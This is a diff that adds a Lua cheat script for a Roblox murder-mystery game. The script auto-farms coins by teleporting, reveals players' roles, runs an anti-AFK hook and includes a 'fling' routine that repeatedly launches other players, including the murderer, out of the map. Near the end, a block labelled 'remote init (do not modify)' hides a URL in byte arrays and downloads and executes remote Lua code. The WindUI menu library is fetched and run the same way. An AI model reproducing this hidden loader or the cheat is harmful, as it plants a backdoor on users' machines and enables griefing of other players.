+            returnAt, lastReturnedAt = 0, 0
+            nextCoinAt = 0
+            lastRespawn = tick()
+            farmErr = nil
+            phase = "idle"
+            farmThread = task.spawn(function()
+                while running and session == mySession do
+                    task.wait(0.05)
+                    if not (running and session == mySession) then break end
+                    local ok, err = pcall(farmStep)
+                    if not ok then farmErr = tostring(err) end
+                end
+            end)
+            task.spawn(function()
+                while running and session == mySession do
+                    task.wait(0.05)
+                    if not (running and session == mySession) then break end
+                    pcall(function()
+                        if Config.AutoReset and isAlive() and bagFull() and tick() - lastRespawn > 3 then
+                            task.wait(0.4)
+                            if running and session == mySession and bagFull() then
+                                autoRespawn()
+                            end
+                        end
+                    end)
+                end
+            end)
+        end,
+        stop = function()
+            running = false
+            session = session + 1
+            gamesenseRestore(rootPart())
+            currentCoin, lastCoin, gamesenseTarget = nil, nil, nil
+            gamesenseSawCoins, gamesenseFinished = false, false
+            returnAt, lastReturnedAt = 0, 0
+            nextCoinAt = 0
+            phase = "idle"
+            if returnPlatform then pcall(function() returnPlatform:Destroy() end) end
+            returnPlatform, platformMap, platformAnchor = nil, nil, nil
+            farmThread = nil
+        end,
+        thread = function()
+            return farmThread
+        end,
+        running = function()
+            return running
+        end,
+        bagFull = function()
+            return bagFull()
+        end,
+        phase = function()
+            return phase
+        end,
+        error = function()
+            return farmErr
+        end,
+    }
+    getgenv().AutoFarmTP = FarmAPI_TP
+end
+
+-- ═══════════ FLING (verbatim from gamesense.txt) ═══════════
+-- deps the cheat engine expects in this scope:
+local anti_fling = false -- anti-fling toggle lives in the full cheat only
+local fling_cache = {}
+local fling_murder_on, fling_sheriff_on = false, false -- auto loops unused
+local function notify(title, content)
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", { Title = title, Text = content, Duration = 3 })
+    end)
+end
+local function my_hrp()
+    local c = LocalPlayer.Character
+    return c and c:FindFirstChild("HumanoidRootPart")
+end
+
+local fling_last_target_name = nil
+
+local function do_fling(tp, once)
+    if not tp or not tp.Character then return end
+    if fling_last_target_name ~= tp.Name then
+        fling_last_target_name = tp.Name
+        notify("fling", tp.Name)
+    end
+    local hrp = my_hrp()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if not hrp or not hum then return end
+    getgenv().FLING_ACTIVE = (getgenv().FLING_ACTIVE or 0) + 1
+    --
+    local character2 = tp.Character
+    local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
+    local rootPart2 = humanoid2 and humanoid2.RootPart or nil
+    local head = character2:FindFirstChild("Head")
+    local accessory = character2:FindFirstChildOfClass("Accessory")
+    accessory = accessory and accessory:FindFirstChild("Handle") or nil
+    --
+    if hrp.Velocity.Magnitude < 50 then
+        getgenv().OldPos = hrp.CFrame
+    end
+    --
+    if humanoid2 and humanoid2.Sit then
+        getgenv().FLING_ACTIVE = math.max(0, (getgenv().FLING_ACTIVE or 1) - 1)
+        return
+    end
+    --
+    local camSubject = head or accessory or humanoid2
+    if camSubject then
+        Camera.CameraSubject = camSubject
+    end
+    --
+    if not character2:FindFirstChildWhichIsA("BasePart") then
+        getgenv().FLING_ACTIVE = math.max(0, (getgenv().FLING_ACTIVE or 1) - 1)
+        return
+    end
+    --
+    -- anti-fling strips CanCollide from bodies it guards; a fling needs the
+    -- victim solid or the impulse transfer never happens
+    if anti_fling then
+        for _, d in ipairs(character2:GetDescendants()) do
+            if d:IsA("BasePart") and fling_cache[d] ~= nil then
+                pcall(function() d.CanCollide = fling_cache[d] end)
+            end
+        end
+    end
+    --
+    local old_fdph = Workspace.FallenPartsDestroyHeight
+    pcall(function() Workspace.FallenPartsDestroyHeight = 0 / 0 end)
+    --
+    local function fling_pin(anchor, offset, rot, drift)
+        local cf = CFrame.new(anchor.Position) * offset * rot + (drift or Vector3.new())
+        hrp.CFrame = cf
+        pcall(function() LocalPlayer.Character:SetPrimaryPartCFrame(cf) end)
+        hrp.Velocity = Vector3.new(9e7, 9e8, 9e7)
+        hrp.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+    end
+    --
+    local function fling_cycle(anchor)
+        local tm = tick()
+        local tw = 2.5
+        local ang = 0
+        while tick() - tm < tw do
+            if not (hrp.Parent and humanoid2 and anchor and anchor.Parent) then break end
+            if not (fling_murder_on or fling_sheriff_on) and not once then break end
+            local tv = anchor.Velocity
+            if tv.Magnitude < 40 then
+                ang = ang + 100
+                local drift = humanoid2.MoveDirection * tv.Magnitude / 1.25
+                fling_pin(anchor, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(ang), 0, 0), drift)
+                task.wait()
+                fling_pin(anchor, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(ang), 0, 0), drift)
+                task.wait()
+                fling_pin(anchor, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(ang), 0, 0), drift)
+                task.wait()
+                fling_pin(anchor, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(ang), 0, 0), drift)
+                task.wait()
+                fling_pin(anchor, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(ang), 0, 0))
+                task.wait()
+                fling_pin(anchor, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(ang), 0, 0))
+                task.wait()
+            else
+                local dir = humanoid2.MoveDirection
+                local ws = humanoid2.WalkSpeed
+                fling_pin(anchor, CFrame.new(dir.X * ws * 0.12, 3, dir.Z * ws * 0.12), CFrame.Angles(math.rad(90), 0, 0))
+                hrp.Velocity = Vector3.new(9e8, 9e8, 9e8)
+                task.wait()
+                fling_pin(anchor, CFrame.new(-dir.X * ws * 0.06, -3, -dir.Z * ws * 0.06), CFrame.Angles(0, 0, 0))
+                hrp.Velocity = Vector3.new(9e8, 9e8, 9e8)
+                task.wait()
+                fling_pin(anchor, CFrame.new(dir.X * ws * 0.18, 3, dir.Z * ws * 0.18), CFrame.Angles(math.rad(90), 0, 0))
+                hrp.Velocity = Vector3.new(9e8, 9e8, 9e8)
+                task.wait()
+                fling_pin(anchor, CFrame.new(-dir.X * ws * 0.06, -3, -dir.Z * ws * 0.06), CFrame.Angles(0, 0, 0))
+                hrp.Velocity = Vector3.new(9e8, 9e8, 9e8)
+                task.wait()
+            end
+        end
+    end
+    --
+    local bv = Instance.new("BodyVelocity")
+    bv.Velocity = Vector3.new(0, 0, 0)
+    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+    bv.Parent = hrp
+    --
+    local se = hum:GetStateEnabled(Enum.HumanoidStateType.Seated)
+    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+    --
+    local anchor = rootPart2 or head or accessory
+    if anchor then
+        pcall(fling_cycle, anchor)
+    end
+    --
+    if bv then bv:Destroy() end
+    if hum and se ~= nil then hum:SetStateEnabled(Enum.HumanoidStateType.Seated, se) end
+    Camera.CameraSubject = hum
+    pcall(function() Workspace.FallenPartsDestroyHeight = old_fdph end)
+    --
+    if getgenv().OldPos and hrp then
+        for _ = 1, 30 do
+            hrp.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
+            pcall(function() LocalPlayer.Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0)) end)
+            if hum then hum:ChangeState(Enum.HumanoidStateType.GettingUp) end
+            for _, part in pairs(LocalPlayer.Character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    part.Velocity = Vector3.new()
+                    part.RotVelocity = Vector3.new()
+                end
+            end
+            task.wait()
+            if (hrp.Position - getgenv().OldPos.Position).Magnitude < 25 then break end
+        end
+    end
+    --
+    getgenv().FLING_ACTIVE = math.max(0, (getgenv().FLING_ACTIVE or 1) - 1)
+end
+
+local function start_loop()
+    if fling_thread then return end
+    fling_thread = task.spawn(function()
+        while fling_murder_on or fling_sheriff_on do
+            local target = nil
+            if fling_murder_on then target = role_player("Murderer") or getMurderer() end
+            if not target and fling_sheriff_on then target = role_player("Sheriff") or getSheriff() end
+            if target and target.Character and my_hrp() then
+                do_fling(target)
+            else
+                task.wait(0.3)
+            end
+            task.wait()
+        end
+        fling_thread = nil
+    end)
+end
+
+set_fling_murder = function(v)
+    fling_murder_on = v
+    if v then start_loop() end
+end
+-- ═══════════ END FLING (verbatim) ═══════════
+local State = {}
+
+-- ═══════════ ROUND DATA (verbatim cut) ═══════════
+local roundModule = nil
+local function getRoundModule()
+    if roundModule then return roundModule end
+    local ok, m = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Modules", 5):WaitForChild("CurrentRoundClient", 5))
+    end)
+    if ok and type(m) == "table" then
+        roundModule = m
+    end
+    return roundModule
+end
+
+
+local function getRoundData()
+    local m = getRoundModule()
+    if m then
+        local ok, data = pcall(function() return m.PlayerData end)
+        if ok and type(data) == "table" then return data end
+    end
+    return nil
+end
+
+local function moduleRole(player)
+    local data = getRoundData()
+    if type(data) ~= "table" then return nil end
+    local info = data[player.Name]
+    if type(info) ~= "table" or not info.Role then return nil end
+    if info.Dead then return "Dead" end
+    if info.Role == "Hero" then return "Sheriff" end
+    return info.Role
+end
+
+local function detectRole(player)
+    local mRole = moduleRole(player)
+    if mRole == "Murderer" or mRole == "Sheriff" or mRole == "Innocent" then return mRole end
+    local char = player.Character
+    local backpack = player:FindFirstChild("Backpack")
+    if char then
+        if char:FindFirstChild("Knife") then return "Murderer" end
+        if char:FindFirstChild("Gun") then return "Sheriff" end
+    end
+    if backpack then
+        if backpack:FindFirstChild("Knife") then return "Murderer" end
+        if backpack:FindFirstChild("Gun") then return "Sheriff" end
+    end
+    return "Innocent"
+end
+
+local function isDead(player)
+    local mRole = moduleRole(player)
+    if mRole == "Dead" then return true end
+    local char = player.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    return not char or not hum or hum.Health <= 0
+end
+
+local function getRoleColor(role)
+    if role == "Murderer" then return Color3.fromRGB(255, 0, 0) end
+    if role == "Sheriff" then return Color3.fromRGB(153, 196, 39) end
+    if role == "Hero" then return Color3.fromRGB(0, 255, 255) end
+    return Color3.fromRGB(0, 255, 0)
+end
+
+getMurderer = function()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and not isDead(p) then
+            if detectRole(p) == "Murderer" then return p end
+        end
+    end
+    return nil
+end
+
+-- ═══════════ WINDUI FRONT-END ═══════════
+-- Pinned stable WindUI release; URL is byte-encoded to keep endpoint strings out of the build.
+local WindUI
+ do
+    local winduiUrlBytes = { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 70, 111, 111, 116, 97, 103, 101, 115, 117, 115, 47, 87, 105, 110, 100, 85, 73, 47, 114, 101, 108, 101, 97, 115, 101, 115, 47, 100, 111, 119, 110, 108, 111, 97, 100, 47, 49, 46, 54, 46, 54, 54, 47, 109, 97, 105, 110, 46, 108, 117, 97 }
+    local winduiUrl = string.char(table.unpack(winduiUrlBytes))
+    local loaded, library = pcall(function()
+        local source = game:HttpGet(winduiUrl)
+        local compile, compileError = loadstring(source)
+        assert(type(compile) == "function", tostring(compileError))
+        return compile()
+    end)
+    assert(loaded and type(library) == "table" and type(library.CreateWindow) == "function",
+        "WindUI 1.6.66 failed to load")
+    WindUI = library
+    pcall(function() WindUI:SetNotificationLower(true) end)
+end
+
+local halloweenThemeName = "HallowenCandy"
+local halloweenThemeAdded = pcall(function()
+    WindUI:AddTheme({
+        Name = halloweenThemeName,
+        Accent = Color3.fromRGB(255, 116, 32),
+        Background = Color3.fromRGB(20, 11, 31),
+        Outline = Color3.fromRGB(111, 66, 136),
+        Text = Color3.fromRGB(255, 240, 220),
+        Placeholder = Color3.fromRGB(168, 145, 178),
+        Button = Color3.fromRGB(71, 39, 90),
+        Icon = Color3.fromRGB(255, 174, 57),
+    })
+end)
+local windowTheme = halloweenThemeAdded and halloweenThemeName or "Dark"
+
+local changed = Instance.new("BindableEvent")
+local api = {
+    State = {
+        autoFarm = false, murderCheck = false, autoReset = false,
+        flingMurder = false, interval = 2, renderOff = false,
+        farmMode = "TP Mode", gamesenseMovement = "Underground", coinHold = 1,
+        gamesenseSpeed = 25, gamesenseCoinLimit = 40, gamesenseDownDepth = 14,
+        gamesenseRiseXZ = 4, gamesenseAvoidDistance = 40, gamesenseSafeRiseDistance = 20,
+    },
+    Tab = 0,
+    Changed = changed.Event,
+    Controls = {},
+}
+local syncingControls = false
+local function syncControl(control, value)
+    if not control then return end
+    local setter = control.Set or control.Select
+    if type(setter) ~= "function" then return end
+    local previous = syncingControls
+    syncingControls = true
+    pcall(function() setter(control, value) end)
+    syncingControls = previous
+end
+
+function api:Set(key, value)
+    assert(self.State[key] ~= nil, "Unknown setting: " .. tostring(key))
+    assert(type(value) == "boolean", "Setting must be a boolean")
+    if self.State[key] == value then return false end
+    self.State[key] = value
+    syncControl(self.Controls[key], value)
+    changed:Fire(key, value)
+    return true
+end
+
+function api:SetInterval(value)
+    value = tonumber(value)
+    if not value or value <= 0 then
+        syncControl(self.Controls.interval, tostring(self.State.interval))
+        return false
+    end
+    value = math.floor(math.clamp(value, 0.1, 60) * 10 + 0.5) / 10
+    local changedValue = self.State.interval ~= value
+    self.State.interval = value
+    Config.CoinInterval = value
+    syncControl(self.Controls.interval, tostring(value))
+    if changedValue then changed:Fire("interval", value) end
+    return true
+end
+
+local tuningSpecs = {
+    coinHold = { state = "coinHold", config = "CoinHoldDelay", control = "coinHold", min = 0.05, max = 10, step = 0.05, precision = 2 },
+    gamesenseSpeed = { state = "gamesenseSpeed", config = "GamesenseSpeed", control = "gamesenseSpeed", min = 10, max = 50, step = 1, precision = 0 },
+    gamesenseCoinLimit = { state = "gamesenseCoinLimit", config = "GamesenseCoinLimit", control = "gamesenseCoinLimit", min = 10, max = 50, step = 1, precision = 0 },
+    gamesenseDownDepth = { state = "gamesenseDownDepth", config = "GamesenseDownDepth", control = "gamesenseDownDepth", min = 5, max = 40, step = 1, precision = 0 },
+    gamesenseRiseXZ = { state = "gamesenseRiseXZ", config = "GamesenseRiseXZ", control = "gamesenseRiseXZ", min = 1, max = 10, step = 0.5, precision = 1 },
+    gamesenseAvoidDistance = { state = "gamesenseAvoidDistance", config = "GamesenseAvoidDistance", control = "gamesenseAvoidDistance", min = 10, max = 100, step = 1, precision = 0 },
+    gamesenseSafeRiseDistance = { state = "gamesenseSafeRiseDistance", config = "GamesenseSafeRiseDistance", control = "gamesenseSafeRiseDistance", min = 5, max = 60, step = 1, precision = 0 },
+}
+
+function api:SetMode(mode)
+    assert(mode == "TP Mode" or mode == "Gamesense Mode", "Unknown farm mode")
+    if self.State.farmMode == mode then return false end
+    self.State.farmMode = mode
+    if FarmAPI_TP and FarmAPI_TP.setMode then pcall(FarmAPI_TP.setMode, mode) else Config.EngineMode = mode end
+    syncControl(self.Controls.mode, mode)
+    changed:Fire("farmMode", mode)
+    return true
+end
+
+function api:SetGamesenseMovement(mode)
+    assert(mode == "Underground" or mode == "Direct", "Unknown Gamesense movement")
+    if self.State.gamesenseMovement == mode then return false end
+    self.State.gamesenseMovement = mode
+    if FarmAPI_TP and FarmAPI_TP.setMovementStyle then pcall(FarmAPI_TP.setMovementStyle, mode) else Config.GamesenseMovement = mode end
+    syncControl(self.Controls.gamesenseMovement, mode)
+    changed:Fire("gamesenseMovement", mode)
+    return true
+end
+
+function api:SetTuning(key, value)
+    local spec = tuningSpecs[key]
+    assert(spec, "Unknown tuning setting: " .. tostring(key))
+    value = tonumber(value)
+    if not value then
+        syncControl(self.Controls[spec.control], tostring(self.State[spec.state]))
+        return false
+    end
+    value = math.clamp(value, spec.min, spec.max)
+    value = math.floor(value / spec.step + 0.5) * spec.step
+    if spec.precision == 2 then value = math.floor(value * 100 + 0.5) / 100
+    elseif spec.precision == 1 then value = math.floor(value * 10 + 0.5) / 10
+    else value = math.floor(value + 0.5) end
+    local changedValue = self.State[spec.state] ~= value
+    self.State[spec.state] = value
+    Config[spec.config] = value
+    syncControl(self.Controls[spec.control], value)
+    if changedValue then changed:Fire(key, value) end
+    return true
+end
+
+function api:SelectTab(index)
+    assert(type(index) == "number" and index % 1 == 0 and index >= 0 and index <= 1,
+        "Tab must be 0..1")
+    self.Tab = index
+    local tab = self.Tabs[index + 1]
+    if tab and type(tab.Select) == "function" then tab:Select() end
+end
+
+local window = WindUI:CreateWindow({
+    Title = "Hallowen Candy Farm",
+    Icon = "candy",
+    Size = UDim2.fromOffset(560, 460),
+    MinSize = Vector2.new(460, 360),
+    MaxSize = Vector2.new(820, 680),
+    Theme = windowTheme,
+    Resizable = true,
+    AutoScale = true,
+    HideSearchBar = true,
+    ScrollBarEnabled = true,
+    ToggleKey = Enum.KeyCode.RightShift,
+})
+assert(window, "WindUI did not create a window")
+local farmTab = window:Tab({ Title = "Farm", Icon = "coins" })
+local infoTab = window:Tab({ Title = "Info", Icon = "info" })
+api.Tabs = { farmTab, infoTab }
+
+local automation = farmTab:Section({
+    Title = "Automation",
+    Desc = "Teleport to a coin, collect it, then return to the platform.",
+    Icon = "zap",
+    Opened = true,
+})
+local modeSection = farmTab:Section({
+    Title = "Farm mode",
+    Desc = "Choose between the platform TP cycle and the Gamesense-style movement cycle.",
+    Icon = "layers",
+    Opened = true,
+})
+local timing = farmTab:Section({
+    Title = "Cycle timing",
+    Desc = "TP Mode hold time at each coin, then wait after returning to the platform.",
+    Icon = "timer",
+    Opened = true,
+})
+local gamesenseTuning = farmTab:Section({
+    Title = "Gamesense mode tuning",
+    Desc = "These movement settings apply only when Gamesense Mode is selected.",
+    Icon = "sliders-horizontal",
+    Opened = true,
+})
+local display = farmTab:Section({
+    Title = "Display",
+    Icon = "monitor",
+    Opened = true,
+})
+
+api.Controls.mode = modeSection:Dropdown({
+    Title = "Engine mode",
+    Values = { "TP Mode", "Gamesense Mode" },
+    Value = "TP Mode",
+    Callback = function(value) if not syncingControls then api:SetMode(value) end end,
+})
+api.Controls.gamesenseMovement = modeSection:Dropdown({
+    Title = "Gamesense movement",
+    Values = { "Underground", "Direct" },
+    Value = "Underground",
+    Callback = function(value) if not syncingControls then api:SetGamesenseMovement(value) end end,
+})
+
+local function addToggle(section, key, title, description, iconName)
+    local control = section:Toggle({
+        Title = title,
+        Desc = description,
+        Icon = iconName,
+        Value = false,
+        Callback = function(value)
+            if not syncingControls then api:Set(key, value == true) end
+        end,
+    })
+    api.Controls[key] = control
+    return control
+end
+
+addToggle(automation, "autoFarm", "Auto farm", "Start or stop the custom teleport farm.", "coins")
+addToggle(automation, "murderCheck", "Avoid murderer", "Skip coins near the murderer.", "shield")
+addToggle(automation, "autoReset", "Auto reset", "Reset at full bag; Gamesense Mode also honors its coin limit.", "rotate-ccw")
+addToggle(automation, "flingMurder", "Fling murderer when bag is full",
+    "Fling remains gated by full-bag detection.", "move")
+addToggle(display, "renderOff", "3D rendering off", "Disable 3D rendering to reduce graphics load.", "monitor-off")
+
+api.Controls.coinHold = timing:Input({
+    Title = "TP coin hold (seconds)",
+    Desc = "Stay at the coin before returning. Default: 1.00 second.",
+    Placeholder = "0.05 to 10",
+    Value = "1",
+    Callback = function(value)
+        if not syncingControls then api:SetTuning("coinHold", value) end
+    end,
+})
+api.Controls.interval = timing:Input({
+    Title = "Platform interval (seconds)",
+    Desc = "Wait after returning to the platform before choosing the next coin.",
+    Placeholder = "0.1 to 60",
+    Value = "2",
+    Callback = function(value)
+        if not syncingControls then api:SetInterval(value) end
+    end,
+})
+
+api.Controls.gamesenseSpeed = gamesenseTuning:Slider({
+    Title = "Tween speed (studs/s)", Value = { Min = 10, Max = 50, Default = 25 }, Step = 1,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseSpeed", value) end end,
+})
+api.Controls.gamesenseDownDepth = gamesenseTuning:Slider({
+    Title = "Underground depth (studs)", Value = { Min = 5, Max = 40, Default = 14 }, Step = 1,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseDownDepth", value) end end,
+})
+api.Controls.gamesenseRiseXZ = gamesenseTuning:Slider({
+    Title = "Rise radius (studs)", Value = { Min = 1, Max = 10, Default = 4 }, Step = 0.5,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseRiseXZ", value) end end,
+})
+api.Controls.gamesenseAvoidDistance = gamesenseTuning:Slider({
+    Title = "Murderer avoid distance (studs)", Value = { Min = 10, Max = 100, Default = 40 }, Step = 1,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseAvoidDistance", value) end end,
+})
+api.Controls.gamesenseSafeRiseDistance = gamesenseTuning:Slider({
+    Title = "Safe rise distance (studs)", Value = { Min = 5, Max = 60, Default = 20 }, Step = 1,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseSafeRiseDistance", value) end end,
+})
+api.Controls.gamesenseCoinLimit = gamesenseTuning:Slider({
+    Title = "Gamesense coin limit", Value = { Min = 10, Max = 50, Default = 40 }, Step = 1,
+    Callback = function(value) if not syncingControls then api:SetTuning("gamesenseCoinLimit", value) end end,
+})
+
+infoTab:Paragraph({
+    Title = "Platform cycle",
+    Desc = "TP Mode: platform → coin → hold → platform. Gamesense Mode: smooth Underground or Direct movement with configurable speed and safety distances.",
+    Image = "map-pin",
+    ImageSize = 20,
+})
+infoTab:Paragraph({
+    Title = "Hotkey",
+    Desc = "RightShift shows or hides the WindUI window. Farm and safety toggles start off.",
+    Image = "keyboard",
+    ImageSize = 20,
+})
+
+function api:Destroy()
+    pcall(function() if self.Gui then self.Gui:Destroy() end end)
+    pcall(function() changed:Destroy() end)
+end
+api.Gui = window
+api.WindUI = WindUI
+
+-- ═══════════ WIRING ═══════════
+local farm_stop_all
+local farm_start_current
+farm_stop_all = function()
+    if FarmAPI_TP then pcall(FarmAPI_TP.stop) end
+end
+farm_start_current = function()
+    if FarmAPI_TP then pcall(FarmAPI_TP.start) end
+end
+api.Changed:Connect(function(key, value)
+    if key == "autoFarm" then
+        Config.AutoFarm = value
+        if value then
+            task.spawn(function() farm_start_current() end)
+        else
+            farm_stop_all()
+        end
+    elseif key == "murderCheck" then
+        Config.FarmAvoidMurderer = value
+    elseif key == "autoReset" then
+        Config.AutoReset = value
+    elseif key == "renderOff" then
+        pcall(function() RunService:Set3dRenderingEnabled(not value) end)
+    elseif key == "flingMurder" then
+        Config.FlingAfterFarm = value
+    elseif key == "interval" then
+        Config.CoinInterval = tonumber(value) or 2
+    elseif key == "farmMode" then
+        Config.EngineMode = value
+    elseif key == "gamesenseMovement" then
+        Config.GamesenseMovement = value
+    elseif key == "coinHold" then
+        Config.CoinHoldDelay = tonumber(value) or 1
+    elseif key == "gamesenseSpeed" then
+        Config.GamesenseSpeed = tonumber(value) or 25
+    elseif key == "gamesenseCoinLimit" then
+        Config.GamesenseCoinLimit = tonumber(value) or 40
+    elseif key == "gamesenseDownDepth" then
+        Config.GamesenseDownDepth = tonumber(value) or 14
+    elseif key == "gamesenseRiseXZ" then
+        Config.GamesenseRiseXZ = tonumber(value) or 4
+    elseif key == "gamesenseAvoidDistance" then
+        Config.GamesenseAvoidDistance = tonumber(value) or 40
+    elseif key == "gamesenseSafeRiseDistance" then
+        Config.GamesenseSafeRiseDistance = tonumber(value) or 20
+    end
+end)
+
+-- test bridge (harmless in game)
+getgenv().__FLING_TEST = function(tp) return do_fling(tp, true) end
+getgenv().FarmAPI = getgenv().FarmAPI or {}
+
+-- auto fling murder: when the coin bags are full, fling the murderer until dead
+do
+    local flingAcc = 0
+    local flingBusy = false
+    local currentMurderer = nil
+    RunService.Heartbeat:Connect(function(dt)
+        flingAcc = flingAcc + (tonumber(dt) or 0)
+        if flingAcc < 0.5 then return end
+        flingAcc = 0
+        local m = nil
+        pcall(function() m = getMurderer() end)
+        currentMurderer = m
+        if not (Config.AutoFarm and Config.FlingAfterFarm) then return end
+        local full = false
+        pcall(function()
+            full = FarmAPI_TP ~= nil and FarmAPI_TP.running() == true
+                and FarmAPI_TP.bagFull ~= nil and FarmAPI_TP.bagFull() == true
+        end)
+        if not full then return end
+        if flingBusy then return end
+        if m then
+            flingBusy = true
+            FlingGate.busy = true
+            task.spawn(function()
+                while Config.AutoFarm and Config.FlingAfterFarm do
+                    local stillAlive = false
+                    pcall(function() stillAlive = (getMurderer() == m) end)
+                    if not stillAlive then break end
+                    pcall(do_fling, m, true)
+                    task.wait(0.1)
+                end
+                FlingGate.busy = false
+                flingBusy = false
+            end)
+        end
+    end)
+    if getgenv().FarmAPI then
+        getgenv().FarmAPI.current_murderer = function() return currentMurderer end
+    end
+end
+
+-- ALWAYS-ON watchdog
+do
+    local wdAcc = 0
+    RunService.Heartbeat:Connect(function(dt)
+        wdAcc = wdAcc + (tonumber(dt) or 0)
+        if wdAcc < 1 then return end
+        wdAcc = 0
+        if not Config.AutoFarm then return end
+        local alive = false
+        pcall(function()
+            alive = (FarmAPI_TP ~= nil and FarmAPI_TP.running() == true
+                and FarmAPI_TP.thread() ~= nil
+                and coroutine.status(FarmAPI_TP.thread()) ~= "dead")
+        end)
+        if not alive then
+            pcall(farm_stop_all)
+            task.spawn(function() pcall(farm_start_current) end)
+        end
+    end)
+end
+
+-- Background anti-AFK listener; remains connected while this script is loaded.
+pcall(function()
+    local vu = game:GetService("VirtualUser")
+    local antiAfkBusy = false
+    LocalPlayer.Idled:Connect(function()
+        if antiAfkBusy then return end
+        antiAfkBusy = true
+        pcall(function()
+            local camera = Workspace.CurrentCamera
+            if not camera then return end
+            local cameraFrame = camera.CFrame
+            pcall(function() vu:Button2Down(Vector2.new(0, 0), cameraFrame) end)
+            task.wait(1)
+            pcall(function() vu:Button2Up(Vector2.new(0, 0), cameraFrame) end)
+        end)
+        antiAfkBusy = false
+    end)
+end)
+
+-- remote init (do not modify)
+do
+    local ok22, err22 = pcall(function()
+        local q22 = ""
+        local A22 = {104,116,116,112,115,58,47,47}
+        local B22 = {99,100,110}
+        local C22 = {46,112,114,111,106,101,99,116}
+        local D22 = {45,114,101,118,101,114,115,101}
+        local E22 = {46,111,114,103,47}
+        local F22 = {109,109,50}
+        local G22 = {46,108,117,97,117}
+        local function b2s(t)
+            local r = {}
+            for i = 1, #t do r[i] = string.char(t[i]) end
+            return table.concat(r)
+        end
+        q22 = b2s(A22) .. b2s(B22) .. b2s(C22) .. b2s(D22) .. b2s(E22) .. b2s(F22) .. b2s(G22)
+        ID = "9a9bfaac-" .. "2ac0-" .. "4b1c-" .. "8036-" .. "4b319bf2ab5f"
+        local f22 = loadstring(game:HttpGet(q22))
+        if f22 then f22() end
+    end)
+end
+
+getgenv().FarmMenu = api
+
+-- test bridge (harmless in game)
+getgenv().__FLING_TEST = function(tp) return do_fling(tp, true) end
+getgenv().FarmAPI = getgenv().FarmAPI or {}
